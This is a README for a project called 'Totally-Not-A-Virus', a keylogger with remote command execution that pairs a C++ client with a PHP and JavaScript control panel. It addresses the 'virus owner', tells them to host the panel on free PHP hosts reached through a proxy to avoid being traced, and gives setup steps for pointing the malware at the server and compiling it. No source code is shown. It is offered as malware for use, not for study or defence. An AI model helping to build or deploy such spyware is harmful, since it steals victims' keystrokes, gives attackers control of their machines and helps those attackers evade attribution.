# Totally-Not-A-Virus

Keylogger with remote command execution and web interface.

The keylogger itself is written in C++.

The backend is a website written in JavaScript (with jQuery) and PHP.

## Why PHP backend
PHP was chosen on purpose.
As a virus owner you wouldn't want to host the server on his own computer.
There are hundreds of free PHP servers on the internet. The owner can upload & use the web interface through a proxy and stay safe.

## Installation

1. Upload all files in 'Backend' to a web server with PHP.

2. Change the server URLs in the following file:
   /Hax/Hax/Settings.h

3. Compile the project 'Hax' using Visual Studio. Support for C++11 is required.
